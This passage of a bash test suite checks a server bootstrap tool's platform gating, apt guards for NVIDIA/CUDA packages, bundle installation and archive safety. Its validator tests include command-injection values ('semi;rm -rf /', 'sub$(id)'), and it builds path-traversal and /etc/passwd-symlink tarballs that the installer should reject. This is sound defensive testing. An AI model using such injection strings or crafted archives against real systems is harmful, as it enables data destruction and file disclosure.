grep -qF 'integrity comes from npm and the registry' README.md \
    || { bad "README.md does not say where the AI CLIs' integrity comes from"; claim_drift=1; }
grep -qF 'no SHA-256' docs/CONFIGURATION.md \
    || { bad "docs/CONFIGURATION.md does not distinguish the two guarantees"; claim_drift=1; }
(( claim_drift == 0 )) && ok "no document claims a repository checksum covers the npm CLIs"

section "History-preservation policy"
# The policy is only useful if it is discoverable and specific. These assert the
# document exists, names the operations it forbids, and is linked from the
# places a contributor actually looks.
[[ -s SECURITY.md ]] && ok "SECURITY.md is present" || bad "SECURITY.md is missing"
while IFS='|' read -r label needle; do
    [[ -n "$label" ]] || continue
    grep -Fqi -- "$needle" SECURITY.md \
        && ok "policy names $label" \
        || bad "policy does not name $label"
done <<'POLICY'
git filter-repo|filter-repo
git filter-branch|filter-branch
BFG|BFG
force-push|force-push
tag replacement|release tag
credential rotation|Rotate first
the no-key-shaped-fixture rule|Never commit a key-shaped string
POLICY
grep -Fq '](SECURITY.md)' README.md \
    && ok "README links to SECURITY.md" || bad "README does not link to SECURITY.md"
grep -Fq 'SECURITY.md' docs/SECURITY-SCANNING.md \
    && ok "the scanning guide links to SECURITY.md" \
    || bad "the scanning guide does not link to SECURITY.md"

# The policy forbids rewriting published history, so the tags that existed when
# it was written must still resolve. Opt-in, because only some checkouts can
# answer the question: a tag checkout (what release.yml does) carries exactly
# the one tag being built, and a shallow clone carries none. Presence of *a* tag
# is not evidence that the full set was fetched -- treating it as such made this
# check fail the release build for four tags the checkout was never given.
if [[ "${SB_CHECK_PUBLISHED_TAGS:-0}" == 1 ]]; then
    tag_loss=0
    for tag in v1.4.0 v2.0.0 v2.0.1 v2.1.0; do
        git rev-parse -q --verify "refs/tags/$tag" >/dev/null \
            || { bad "published tag is missing: $tag"; tag_loss=1; }
    done
    (( tag_loss == 0 )) && ok "every published release tag still resolves"
else
    skip "published tag check (set SB_CHECK_PUBLISHED_TAGS=1 in a checkout with tags)"
fi

section "Package command compatibility aliases"
# shellcheck source=/dev/null
source lib/bootstrap/packages.sh
ALIAS_FIX="$TMP/command-aliases"
mkdir -p "$ALIAS_FIX/source" "$ALIAS_FIX/bin"
cat > "$ALIAS_FIX/source/fdfind" <<'COMMAND'
#!/usr/bin/env bash
exit 0
COMMAND
chmod 0755 "$ALIAS_FIX/source/fdfind"
sb_warn(){ :; }

alias_rc_first=0
PATH="$ALIAS_FIX/bin:$ALIAS_FIX/source:/usr/bin:/bin" \
BOOTSTRAP_LOCAL_BIN_DIR="$ALIAS_FIX/bin" \
    bootstrap_ensure_command_alias fdfind fd || alias_rc_first=$?
if [[ "$alias_rc_first" == 0 && -L "$ALIAS_FIX/bin/fd" \
    && "$(readlink "$ALIAS_FIX/bin/fd")" == "$ALIAS_FIX/source/fdfind" ]]; then
    ok "fdfind compatibility alias is created"
else bad "fdfind compatibility alias creation"; fi

alias_rc_rerun=0
PATH="$ALIAS_FIX/bin:$ALIAS_FIX/source:/usr/bin:/bin" \
BOOTSTRAP_LOCAL_BIN_DIR="$ALIAS_FIX/bin" \
    bootstrap_ensure_command_alias fdfind fd || alias_rc_rerun=$?
[[ "$alias_rc_rerun" == 0 ]] \
    && ok "existing compatibility alias is idempotent" \
    || bad "existing compatibility alias rerun"

alias_rc_missing=0
PATH="$ALIAS_FIX/bin:/usr/bin:/bin" \
BOOTSTRAP_LOCAL_BIN_DIR="$ALIAS_FIX/bin" \
    bootstrap_ensure_command_alias missing-command missing-alias || alias_rc_missing=$?
[[ "$alias_rc_missing" == 0 && ! -e "$ALIAS_FIX/bin/missing-alias" ]] \
    && ok "missing alias source warns without aborting" \
    || bad "missing alias source handling"

section "Package manifest"
PKG_FIX="$TMP/packages"; mkdir -p "$PKG_FIX"
cat > "$PKG_FIX/manifest.txt" <<'MANIFEST'
# leading comment
[required]
alpha
bravo    # trailing comment

charlie

[optional]
delta
MANIFEST
[[ "$(bootstrap_read_package_section "$PKG_FIX/manifest.txt" required | tr '\n' ' ')" == "alpha bravo charlie " ]] \
    && ok "manifest [required] parsing skips comments and blanks" \
    || bad "manifest [required] parsing"
[[ "$(bootstrap_read_package_section "$PKG_FIX/manifest.txt" optional | tr '\n' ' ')" == "delta " ]] \
    && ok "manifest [optional] parsing is section-scoped" \
    || bad "manifest [optional] parsing"
[[ -z "$(bootstrap_read_package_section "$PKG_FIX/manifest.txt" nosuchsection)" ]] \
    && ok "unknown manifest section yields nothing" || bad "unknown manifest section"

# A package name is interpolated straight onto the apt command line, so the
# validator is a security boundary and not just a typo check.
pkg_name_ok=1
for name in libssl-dev g++ python3.12 p7zip-full node.js-x; do
    bootstrap_valid_package_name "$name" || { bad "valid package name rejected: $name"; pkg_name_ok=0; }
done
for name in '' 'UPPER' '-leading' 'semi;rm -rf /' 'with space' 'sub$(id)' 'under_score'; do
    bootstrap_valid_package_name "$name" && { bad "invalid package name accepted: $name"; pkg_name_ok=0; }
done
(( pkg_name_ok == 1 )) && ok "package name validation accepts and rejects correctly"

manifest_bad=0
while IFS= read -r name; do
    bootstrap_valid_package_name "$name" || { bad "invalid name in shipped manifest: $name"; manifest_bad=1; }
done < <(bootstrap_read_package_section config/packages.txt required
         bootstrap_read_package_section config/packages.txt optional)
(( manifest_bad == 0 )) && ok "shipped package manifest contains only valid names"
[[ "$( { bootstrap_read_package_section config/packages.txt required
         bootstrap_read_package_section config/packages.txt optional; } | sort | uniq -d | wc -l)" == 0 ]] \
    && ok "shipped package manifest has no duplicates" || bad "duplicate package in manifest"
[[ "$(bootstrap_read_package_section config/packages.txt required | wc -l)" -ge 40 ]] \
    && ok "shipped manifest keeps a substantial [required] set" || bad "manifest [required] shrank unexpectedly"

section "Supported platform: rejected before anything is created"
# Ubuntu 24.04 on x86-64 or ARM64 only. Both entry points must refuse any other
# host before the workspace, a log, the lock, or apt. Every host here is a
# fixture, so the result does not depend on the machine running the suite.
PLAT="$TMP/platform"; mkdir -p "$PLAT/os"
os_fixture() { printf '%s\n' "${@:2}" > "$PLAT/os/$1"; }
os_fixture noble 'PRETTY_NAME="Ubuntu 24.04 LTS"' 'NAME="Ubuntu"' 'VERSION_ID="24.04"' 'ID=ubuntu' 'ID_LIKE=debian'
os_fixture noble-single "ID='ubuntu'" "VERSION_ID='24.04'"
os_fixture jammy 'ID=ubuntu' 'VERSION_ID="22.04"'
os_fixture oracular 'ID=ubuntu' 'VERSION_ID="24.10"'
os_fixture resolute 'ID=ubuntu' 'VERSION_ID="26.04"'
os_fixture bookworm 'ID=debian' 'VERSION_ID="12"'
os_fixture mint 'ID=linuxmint' 'ID_LIKE="ubuntu debian"' 'VERSION_ID="22"'
os_fixture empty ''
# fixture|machine|dpkg architecture|expected: ok or a fragment of the reason
PLATFORM_CASES='noble|x86_64|amd64|ok
noble|aarch64|arm64|ok
noble-single|x86_64|amd64|ok
jammy|x86_64|amd64|unsupported operating system: ubuntu 22.04
oracular|x86_64|amd64|unsupported operating system: ubuntu 24.10
resolute|aarch64|arm64|unsupported operating system: ubuntu 26.04
bookworm|x86_64|amd64|unsupported operating system: debian 12
mint|x86_64|amd64|unsupported operating system: linuxmint 22
empty|x86_64|amd64|unsupported operating system: unknown unknown
missing|x86_64|amd64|cannot read
noble|riscv64|riscv64|unsupported architecture: riscv64
noble|armv7l|armhf|unsupported architecture: armv7l
noble|i686|i386|unsupported architecture: i686
noble|aarch64|armhf|dpkg architecture armhf does not match aarch64
noble|x86_64|i386|dpkg architecture i386 does not match x86_64
noble|x86_64||dpkg architecture unknown does not match x86_64'

# The two copies are compared as functions, case by case: the provisioner's is
# pulled out of server-provision.sh rather than restated here.
platform_copies="$(bash -c '
    source lib/core.sh
    eval "$(sed -n "/^os_release_value() {/,/^}/p; /^platform_problem() {/,/^}/p" server-provision.sh)"
    declare -F platform_problem >/dev/null || { echo "MISSING provisioner copy"; exit 0; }
    while IFS="|" read -r fixture machine arch expected; do
        a="$(sb_platform_problem "$0/$fixture" "$machine" "$arch")"
        b="$(platform_problem "$0/$fixture" "$machine" "$arch")"
        [[ "$a" == "$b" ]] || { echo "DIFFER $fixture $machine $arch: [$a] [$b]"; continue; }
        if [[ "$expected" == ok ]]; then [[ -z "$a" ]] || echo "REJECTED $fixture $machine $arch: $a"
        else [[ "$a" == *"$expected"* ]] || echo "WRONG $fixture $machine $arch: [$a]"; fi
    done <<< "$1"
' "$PLAT/os" "$PLATFORM_CASES")"
[[ -z "$platform_copies" ]] \
    && ok "both platform checks accept Ubuntu 24.04 on x86_64/amd64 and aarch64/arm64 and reject every other case alike" \
    || bad "platform checks: $platform_copies"

# Stubs that record any call a rejected run must never make. flock is the
# safety net: even a gate that wrongly passed stops at the bootstrap lock.
mkdir -p "$PLAT/bin"
for tool in apt-get dpkg-query fuser; do
    printf '#!/usr/bin/env bash\nprintf "%%s %%s\\n" %q "$*" >> "$PLAT_CALLS"\nexit 0\n' "$tool" > "$PLAT/bin/$tool"
done
cat > "$PLAT/bin/dpkg" <<'STUB'
#!/usr/bin/env bash
[[ "$1" == --print-architecture ]] && { printf '%s\n' "$PLAT_DPKG_ARCH"; exit 0; }
printf 'dpkg %s\n' "$*" >> "$PLAT_CALLS"
STUB
cat > "$PLAT/bin/uname" <<'STUB'
#!/usr/bin/env bash
[[ "$1" == -m ]] && { printf '%s\n' "$PLAT_MACHINE"; exit 0; }
exec /usr/bin/uname "$@"
STUB
cat > "$PLAT/bin/flock" <<'STUB'
#!/usr/bin/env bash
printf 'flock %s\n' "$*" >> "$PLAT_CALLS"
exit 1
STUB
chmod 0755 "$PLAT/bin/"*
printf 'register_bootstrap ./absent.tar.gz ./absent.sha256\n' > "$PLAT/plan.sh"

platform_entry() {  # command, fixture, machine, dpkg arch; sets pout, pcode, pdir
    local -a args=()
    [[ "$1" != server-provision.sh ]] || args=(--plan "$PLAT/plan.sh")
    pdir="$(mktemp -d "$TMP/platform-run.XXXXXX")"; mkdir -p "$pdir/tmp"
    pout="$(PATH="$PLAT/bin:$PATH" PLAT_CALLS="$pdir/calls" PLAT_MACHINE="$3" PLAT_DPKG_ARCH="$4" \
        SB_OS_RELEASE_FILE="$PLAT/os/$2" WORKSPACE_ROOT="$pdir/ws" TMPDIR="$pdir/tmp" \
        "$ROOT/$1" "${args[@]}" 2>&1)"; pcode=$?
}
for entry in server-bootstrap.sh server-provision.sh; do
    entry_clean=1
    while IFS='|' read -r fixture machine arch expected; do
        [[ "$expected" != ok ]] || continue
        platform_entry "$entry" "$fixture" "$machine" "$arch"
        [[ "$pcode" != 0 && "$pout" == *"$expected"*"nothing was installed or created"* \
            && ! -e "$pdir/ws" && ! -e "$pdir/calls" && -z "$(ls -A "$pdir/tmp")" ]] \
            || { bad "$entry on $fixture/$machine/$arch (exit $pcode): $pout"; entry_clean=0; }
    done <<< "$PLATFORM_CASES"
    (( entry_clean )) && ok "$entry rejects every unsupported host before the workspace, a log, the lock, or apt"
done

# A supported host gets past the gate. The provisioner then creates its log and
# stops at the absent archive (or at the root check); the bootstrap stops at
# the stubbed lock as root, or at its own root check otherwise. Neither reaches apt.
platform_entry server-provision.sh noble x86_64 amd64
[[ "$pcode" != 0 && -d "$pdir/ws/startup-logs" && "$pout" != *"nothing was installed or created"* ]] \
    && ok "server-provision.sh lets Ubuntu 24.04 x86_64 through to its log directory" \
    || bad "server-provision.sh on a supported host (exit $pcode): $pout"
platform_entry server-bootstrap.sh noble aarch64 arm64
if (( EUID == 0 )); then
    [[ "$pcode" != 0 && "$(cat "$pdir/calls" 2>/dev/null)" == 'flock -w 1800 9' && -d "$pdir/ws/startup-logs" ]] \
        && ok "server-bootstrap.sh lets Ubuntu 24.04 aarch64 through to its lock, and no further" \
        || bad "server-bootstrap.sh on a supported host (exit $pcode): $pout"
else
    [[ "$pcode" != 0 && "$pout" == *'run as root'* && ! -e "$pdir/calls" ]] \
        && ok "server-bootstrap.sh lets Ubuntu 24.04 aarch64 through to its root check" \
        || bad "server-bootstrap.sh on a supported host (exit $pcode): $pout"
fi

section "APT transactions: required packages and the NVIDIA/CUDA guard"
# Offline. apt-get, dpkg and dpkg-query are stubs driven by fixture files, so
# no package is resolved, installed or removed on the machine running this.
#   sim/WORD         printed by `apt-get -s ...` when WORD is one of its arguments
#   unavailable/PKG  `apt-get [-s] install ... PKG` fails, as for a missing name
#   dpkg-status      what dpkg-query reports: "NAME WANT FLAG STATUS" lines
# Every call lands in calls: "SIM args", "RUN args", or "DPKG args".
APTX="$TMP/apt"; mkdir -p "$APTX/bin"
cat > "$APTX/bin/apt-get" <<'STUB'
#!/usr/bin/env bash
sim=0; args=()
for arg in "$@"; do if [[ "$arg" == -s ]]; then sim=1; else args+=("$arg"); fi; done
printf '%s %s\n' "$( ((sim)) && echo SIM || echo RUN )" "${args[*]}" >> "$APT_FIX/calls"
for arg in "${args[@]}"; do
    [[ ! -e "$APT_FIX/unavailable/$arg" ]] || { echo "E: Unable to locate package $arg"; exit 100; }
done
if (( sim )); then
    for arg in "${args[@]}"; do [[ ! -f "$APT_FIX/sim/$arg" ]] || cat -- "$APT_FIX/sim/$arg"; done
fi
exit 0
STUB
cat > "$APTX/bin/dpkg" <<'STUB'
#!/usr/bin/env bash
printf 'DPKG %s\n' "$*" >> "$APT_FIX/calls"
STUB
cat > "$APTX/bin/dpkg-query" <<'STUB'
#!/usr/bin/env bash
cat -- "$APT_FIX/dpkg-status" 2>/dev/null || true
STUB
printf '#!/usr/bin/env bash\nexit 1\n' > "$APTX/bin/fuser"
printf '#!/usr/bin/env bash\nexit 0\n' > "$APTX/bin/git"
chmod 0755 "$APTX/bin/"*
cat > "$APTX/manifest.txt" <<'MANIFEST'
[required]
alpha
bravo
charlie
[optional]
delta
echo
MANIFEST
# Strict mode and an inherited ERR trap, as in server-bootstrap.sh: a helper
# that lets a command fail even inside $(...) would mark the run FAILED there.
cat > "$APTX/driver.sh" <<'DRIVER'
set -Eeuo pipefail
trap 'echo "ERR trap: line $LINENO: $BASH_COMMAND" >&2' ERR
source "$REPO/lib/core.sh"
source "$REPO/lib/bootstrap/packages.sh"
sleep() { :; }
bootstrap_packages
DRIVER

apt_scenario() {  # name; then set up $APT_FIX before apt_run
    APT_FIX="$APTX/$1"; mkdir -p "$APT_FIX/sim" "$APT_FIX/unavailable" "$APT_FIX/localbin"
}
apt_run() {  # [VAR=value...]; sets aout, acode, acalls
    aout="$(env PATH="$APTX/bin:$PATH" APT_FIX="$APT_FIX" REPO="$ROOT" \
        PACKAGES_FILE="$APTX/manifest.txt" RUN_APT_UPGRADE=0 \
        BOOTSTRAP_LOCAL_BIN_DIR="$APT_FIX/localbin" "$@" bash "$APTX/driver.sh" 2>&1)"; acode=$?
    acalls="$(cat "$APT_FIX/calls" 2>/dev/null)"
    apt_trap_check
}
has_call() { grep -qxF -- "$1" <<< "$acalls"; }
APT_TRAPPED=""
# Only a run that succeeds must stay clear of the trap; a failing one sets it off
# on purpose, which is how the entry point records STATUS: FAILED.
apt_trap_check() { [[ "$acode" != 0 || "$aout" != *"ERR trap:"* ]] || APT_TRAPPED+="${APT_FIX##*/} "; }
no_call_matching() { ! grep -qE -- "$1" <<< "$acalls"; }
INSTALL='install -y --no-install-recommends'

# The parser alone, on one simulated plan that has every shape of line.
source lib/bootstrap/packages.sh
parsed="$(bootstrap_apt_protected_changes <<'PLAN' | tr '\n' ' '
NOTE: This is only a simulation!
Remv nvidia-driver-550 [550.120-0ubuntu0.24.04.1]
Remv xserver-xorg-video-nvidia-550 [550.120-0ubuntu0.24.04.1]
Purg libcudnn9-cuda-12 [9.1.0.70-1]
Inst libnvidia-compute-550 [550.120-0ubuntu0.24.04.1] (550.127.05-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [amd64])
Inst libnvidia-gl-550:i386 [550.120-0ubuntu0.24.04.1] (550.127.05-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [i386])
Inst linux-modules-nvidia-550-generic [6.8.0-45.45] (6.8.0-47.47 Ubuntu:24.04/noble-updates [amd64])
Inst libnvidia-egl-wayland1 (1:1.1.13-1build1 Ubuntu:24.04/noble [amd64])
Inst libcurl4t64 [8.5.0-2ubuntu10.3] (8.5.0-2ubuntu10.4 Ubuntu:24.04/noble-updates [amd64])
Inst nvtop (3.0.2-1 Ubuntu:24.04/noble/universe [amd64])
Conf libnvidia-egl-wayland1 (1:1.1.13-1build1 Ubuntu:24.04/noble [amd64])
Conf libnvidia-compute-550 (550.127.05-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [amd64])
Conf nvidia-dkms-550 (550.120-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [amd64])
Conf libcurl4t64 (8.5.0-2ubuntu10.4 Ubuntu:24.04/noble-updates [amd64])
PLAN
)"
[[ "$parsed" == "libcudnn9-cuda-12 libnvidia-compute-550 libnvidia-gl-550 linux-modules-nvidia-550-generic nvidia-dkms-550 nvidia-driver-550 xserver-xorg-video-nvidia-550 " ]] \
    && ok "a simulated plan's upgrades, removals, purges and pending configures of driver/CUDA packages are found; fresh installs and other packages are not" \
    || bad "protected-change parser: $parsed"
guard_names_ok=1
for name in curl libcurl4t64 nvtop cmake screen; do
    bootstrap_apt_protected_name "$name" && { bad "not a driver/CUDA package, but protected: $name"; guard_names_ok=0; }
done
for name in nvidia-driver-550 nvidia-utils-550 libnvidia-compute-550 cuda-toolkit-12-4 cuda libcudnn9-cuda-12 \
    cudnn9-cuda-12 libnccl2 libcublas12 libcudart12 nsight-compute xserver-xorg-video-nvidia-550 \
    linux-modules-nvidia-550-generic linux-signatures-nvidia-6.8.0-45-generic firmware-nvidia-gsp-550; do
    bootstrap_apt_protected_name "$name" || { bad "driver/CUDA package not protected: $name"; guard_names_ok=0; }
done
while IFS= read -r name; do
    bootstrap_apt_protected_name "$name" && { bad "shipped manifest names a protected package: $name"; guard_names_ok=0; }
done < <(bootstrap_read_package_section config/packages.txt required
         bootstrap_read_package_section config/packages.txt optional)
# server-bootstrap.sh runs with set -E and an ERR trap that records the run as
# FAILED, and the trap reaches into $(...). Called outside any condition, on a
# plan whose last line is an ordinary upgrade, the parser must not set it off.
parser_trap="$(bash -c '
    set -Eeuo pipefail
    trap "echo TRAPPED >&2" ERR
    source lib/core.sh; source lib/bootstrap/packages.sh
    out="$(printf "Inst libcurl4t64 [1] (2 x [amd64])\n" | bootstrap_apt_protected_changes)"
    printf "Remv nvidia-driver-550 [1]\nInst zlib1g [1] (2 x [amd64])\n" | bootstrap_apt_protected_changes
    dpkg-query() { printf "libfoo1 install ok unpacked\n"; }; dpkg() { :; }
    bootstrap_dpkg_recover
' 2>&1)"
[[ "$parser_trap" == "nvidia-driver-550" ]] \
    && ok "the guard's helpers never set off an inherited ERR trap" \
    || bad "the guard's helpers set off the ERR trap: $parser_trap"
(( guard_names_ok )) && ok "the guard covers driver, CUDA and kernel-module package names, and nothing the foundation itself installs"

# Real plans upgrade ordinary libraries too; those lines must pass untouched.
apt_scenario happy
for word in -f alpha delta echo; do
    printf 'Inst libcurl4t64 [8.5.0-2ubuntu10.3] (8.5.0-2ubuntu10.4 Ubuntu:24.04/noble-updates [amd64])\nConf libcurl4t64 (8.5.0-2ubuntu10.4 Ubuntu:24.04/noble-updates [amd64])\n' \
        > "$APT_FIX/sim/$word"
done
apt_run
[[ "$acode" == 0 && "$acalls" == "DPKG --configure -a
SIM -f install -y
RUN -f install -y
RUN update
SIM $INSTALL alpha bravo charlie
RUN $INSTALL alpha bravo charlie
SIM $INSTALL delta
RUN $INSTALL delta
SIM $INSTALL echo
RUN $INSTALL echo" ]] \
    && ok "a clean host runs every transaction, each simulated first, in the established order" \
    || bad "clean-host apt sequence (exit $acode): $acalls"

apt_scenario required-missing; : > "$APT_FIX/unavailable/bravo"; apt_run
[[ "$acode" != 0 && "$aout" == *"required packages could not be installed: bravo"* ]] \
    && has_call "RUN $INSTALL alpha" && has_call "RUN $INSTALL charlie" \
    && no_call_matching '^RUN .*bravo' && no_call_matching '^(SIM|RUN) .*(delta|echo)' \
    && ok "an uninstallable required package fails the bootstrap, after installing the others and naming it" \
    || bad "required package failure (exit $acode): $aout"

apt_scenario optional-missing; : > "$APT_FIX/unavailable/delta"; apt_run
[[ "$acode" == 0 && "$aout" == *"optional package not installed: delta"* ]] \
    && has_call "RUN $INSTALL alpha bravo charlie" && has_call "RUN $INSTALL echo" && no_call_matching '^RUN .*delta' \
    && ok "an uninstallable optional package still only warns" \
    || bad "optional package failure (exit $acode): $aout"

apt_scenario repair-removes-driver
printf 'Remv nvidia-driver-550 [550.120-0ubuntu0.24.04.1]\nRemv libnvidia-compute-550 [550.120-0ubuntu0.24.04.1]\n' > "$APT_FIX/sim/-f"
apt_run
[[ "$acode" == 0 && "$aout" == *"refused apt-get -f install -y"*"libnvidia-compute-550 nvidia-driver-550"* \
    && "$aout" == *"skipped apt-get -f install"* ]] \
    && has_call "SIM -f install -y" && ! has_call "RUN -f install -y" && has_call "RUN $INSTALL alpha bravo charlie" \
    && ok "apt-get -f install is never run when its plan removes the NVIDIA driver" \
    || bad "fix-broken guard (exit $acode): $aout"

apt_scenario optional-upgrades-driver
printf 'Inst libnvidia-compute-550 [550.120-0ubuntu0.24.04.1] (550.127.05-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [amd64])\n' \
    > "$APT_FIX/sim/delta"
apt_run
[[ "$acode" == 0 && "$aout" == *"refused apt-get $INSTALL delta"* && "$aout" == *"optional package not installed: delta"* ]] \
    && no_call_matching '^RUN .*delta' && has_call "RUN $INSTALL echo" \
    && ok "an optional package whose plan upgrades an installed driver library is skipped, not installed" \
    || bad "optional transaction guard (exit $acode): $aout"

apt_scenario optional-fresh-library
printf 'Inst libnvidia-egl-wayland1 (1:1.1.13-1build1 Ubuntu:24.04/noble [amd64])\nConf libnvidia-egl-wayland1 (1:1.1.13-1build1 Ubuntu:24.04/noble [amd64])\n' \
    > "$APT_FIX/sim/delta"
apt_run
[[ "$acode" == 0 && "$aout" != *refused* ]] && has_call "RUN $INSTALL delta" \
    && ok "a plan that only adds a new NVIDIA library, changing nothing installed, is not refused" \
    || bad "fresh-install false positive (exit $acode): $aout"

apt_scenario required-removes-cuda
printf 'Remv cuda-toolkit-12-4 [12.4.1-1]\n' > "$APT_FIX/sim/charlie"
apt_run
[[ "$acode" != 0 && "$aout" == *"required packages could not be installed: charlie"* ]] \
    && no_call_matching '^RUN .*charlie' && has_call "RUN $INSTALL alpha" && has_call "RUN $INSTALL bravo" \
    && ok "a required package whose plan removes a CUDA package fails the bootstrap without running it" \
    || bad "required transaction guard (exit $acode): $aout"

apt_scenario upgrade-touches-driver
printf 'Inst nvidia-dkms-550 [550.120-0ubuntu0.24.04.1] (550.127.05-0ubuntu0.24.04.1 Ubuntu:24.04/noble-updates [amd64])\n' \
    > "$APT_FIX/sim/upgrade"
apt_run RUN_APT_UPGRADE=1
[[ "$acode" != 0 && "$aout" == *"RUN_APT_UPGRADE=1: apt-get upgrade failed or was refused"* ]] \
    && has_call "SIM upgrade -y" && ! has_call "RUN upgrade -y" \
    && ok "RUN_APT_UPGRADE=1 fails instead of upgrading an installed driver" \
    || bad "upgrade guard (exit $acode): $aout"
apt_scenario upgrade-clean; apt_run RUN_APT_UPGRADE=1
[[ "$acode" == 0 ]] && has_call "RUN upgrade -y" \
    && ok "RUN_APT_UPGRADE=1 still upgrades when no driver or CUDA package would change" \
    || bad "clean upgrade (exit $acode): $aout"

apt_scenario dpkg-pending-driver
printf 'nvidia-dkms-550 install ok half-configured\nlibfoo1 install ok installed\n' > "$APT_FIX/dpkg-status"
apt_run
[[ "$acode" == 0 && "$aout" == *"skipped dpkg --configure -a"*"nvidia-dkms-550"* ]] && ! has_call "DPKG --configure -a" \
    && ok "dpkg --configure -a is skipped while a driver package is left half-configured" \
    || bad "dpkg recovery guard (exit $acode): $aout"
apt_scenario dpkg-pending-other
printf 'libfoo1 install ok unpacked\nnvidia-driver-550 install ok installed\n' > "$APT_FIX/dpkg-status"
apt_run
[[ "$acode" == 0 ]] && has_call "DPKG --configure -a" \
    && ok "dpkg --configure -a still finishes an interrupted run that leaves no driver package pending" \
    || bad "dpkg recovery (exit $acode): $aout"
[[ -z "$APT_TRAPPED" ]] \
    && ok "no scenario sets off the entry point's ERR trap, which would record the run as failed" \
    || bad "the ERR trap fired in: $APT_TRAPPED"

section "Generic bundle installation"
FIX="$TMP/fix"; mkdir -p "$FIX/src/demo-1.0.0"
printf '1.0.0\n' > "$FIX/src/demo-1.0.0/VERSION"
cat > "$FIX/src/demo-1.0.0/install.sh" <<'INSTALL'
#!/usr/bin/env bash
set -e
printf '%s\n' "$*" > "$DEMO_MARK"
INSTALL
chmod 0755 "$FIX/src/demo-1.0.0/install.sh"
tar -czf "$FIX/demo-1.0.0.tar.gz" -C "$FIX/src" demo-1.0.0
sha256sum "$FIX/demo-1.0.0.tar.gz" > "$FIX/demo.sha256"
STATE="$FIX/state"; MARK="$FIX/mark"
if DEMO_MARK="$MARK" STATE_ROOT="$STATE" ./server-bundle-install \
    --name demo --version 1.0.0 --archive "$FIX/demo-1.0.0.tar.gz" \
    --sha256-file "$FIX/demo.sha256" -- --alpha beta >/dev/null; then
    ok "valid bundle installs"
else bad "valid bundle install failed"; fi
[[ "$(cat "$MARK" 2>/dev/null)" == '--alpha beta' ]] && ok "installer args preserved" || bad "installer args"
[[ "$(cat "$STATE/bundles/demo/version" 2>/dev/null)" == 1.0.0 ]] && ok "version state" || bad "version state"
[[ -s "$STATE/bundles/demo/archive-sha256" ]] && ok "archive hash state" || bad "archive hash state"

rm -f "$MARK"
if DEMO_MARK="$MARK" STATE_ROOT="$STATE" ./server-bundle-install \
    --name demo --version 1.0.0 --archive "$FIX/demo-1.0.0.tar.gz" \
    --sha256-file "$FIX/demo.sha256" >/dev/null && [[ ! -e "$MARK" ]]; then
    ok "same version and hash is skipped"
else bad "idempotent skip"; fi

cp "$FIX/demo-1.0.0.tar.gz" "$FIX/delete-me.tar.gz"
sha256sum "$FIX/delete-me.tar.gz" > "$FIX/delete-me.sha256"
if DEMO_MARK="$FIX/delete-mark" STATE_ROOT="$FIX/delete-state" ./server-bundle-install \
    --name delete-demo --version 1.0.0 --archive "$FIX/delete-me.tar.gz" \
    --sha256-file "$FIX/delete-me.sha256" --delete-after-success >/dev/null \
    && [[ ! -e "$FIX/delete-me.tar.gz" && ! -e "$FIX/delete-me.sha256" ]]; then
    ok "archive and sidecar deleted after success"
else bad "success cleanup"; fi

cp "$FIX/demo-1.0.0.tar.gz" "$FIX/fail.tar.gz"
sha256sum "$FIX/fail.tar.gz" > "$FIX/fail.sha256"
mkdir -p "$FIX/badsrc/bad-1.0.0"; printf '1.0.0\n' > "$FIX/badsrc/bad-1.0.0/VERSION"
cat > "$FIX/badsrc/bad-1.0.0/install.sh" <<'BAD'
#!/usr/bin/env bash
exit 7
BAD
chmod +x "$FIX/badsrc/bad-1.0.0/install.sh"
tar -czf "$FIX/fail.tar.gz" -C "$FIX/badsrc" bad-1.0.0
sha256sum "$FIX/fail.tar.gz" > "$FIX/fail.sha256"
if STATE_ROOT="$FIX/fail-state" ./server-bundle-install --name fail-demo --version 1.0.0 \
    --archive "$FIX/fail.tar.gz" --sha256-file "$FIX/fail.sha256" \
    --delete-after-success >/dev/null 2>&1; then
    bad "failing installer accepted"
elif [[ -e "$FIX/fail.tar.gz" && -e "$FIX/fail.sha256" && ! -e "$FIX/fail-state/bundles/fail-demo/version" ]]; then
    ok "failed install retains archive and writes no state"
else bad "failure retention/state"; fi

section "Archive safety"
python3 - "$TMP" <<'PY'
import io, os, tarfile, sys
root=sys.argv[1]
with tarfile.open(os.path.join(root,'traversal.tar.gz'),'w:gz') as t:
    data=b'x'; info=tarfile.TarInfo('../escape'); info.size=len(data); t.addfile(info,io.BytesIO(data))
with tarfile.open(os.path.join(root,'symlink.tar.gz'),'w:gz') as t:
    d=tarfile.TarInfo('pkg'); d.type=tarfile.DIRTYPE; t.addfile(d)
    v=b'1.0.0\n'; vi=tarfile.TarInfo('pkg/VERSION'); vi.size=len(v); t.addfile(vi,io.BytesIO(v))
    i=b'#!/usr/bin/env bash\nexit 0\n'; ii=tarfile.TarInfo('pkg/install.sh'); ii.mode=0o755; ii.size=len(i); t.addfile(ii,io.BytesIO(i))
    s=tarfile.TarInfo('pkg/escape'); s.type=tarfile.SYMTYPE; s.linkname='../../etc/passwd'; t.addfile(s)
PY
mkdir -p "$TMP/xz-src/pkg"; printf 'ok\n' > "$TMP/xz-src/pkg/value.txt"
tar -cJf "$TMP/valid.tar.xz" -C "$TMP/xz-src" pkg
if bash -c 'set -e; source lib/archive.sh; sb_extract_archive "$1" "$2" >/dev/null; [[ "$(cat "$2/pkg/value.txt")" == ok ]]' _ \
    "$TMP/valid.tar.xz" "$TMP/xz-out"; then
    ok "valid tar.xz extracts safely"
else bad "tar.xz extraction"; fi

for kind in traversal symlink; do
    sha256sum "$TMP/$kind.tar.gz" > "$TMP/$kind.sha256"
    if STATE_ROOT="$TMP/$kind-state" ./server-bundle-install --name "$kind" --version 1.0.0 \
        --archive "$TMP/$kind.tar.gz" --sha256-file "$TMP/$kind.sha256" >/dev/null 2>&1; then
        bad "$kind archive accepted"
    else ok "$kind archive rejected"; fi
done

section "Provision plan parsing"
PLAN_DIR="$TMP/plan"; mkdir -p "$PLAN_DIR"
cat > "$PLAN_DIR/plan.sh" <<'PLAN'
register_bootstrap ./base.tar.gz ./base.sha256
register_bundle first 1.0.0 ./first.tar.gz ./first.sha256 install.sh --one
register_bundle second 2.0.0 ./second.tar.gz ./second.sha256 install.sh --two
PLAN
output="$(./server-provision.sh --plan "$PLAN_DIR/plan.sh" --dry-run)"
[[ "$output" == *'Bundles: 2'* ]] && ok "dry-run counts bundles" || bad "dry-run count"
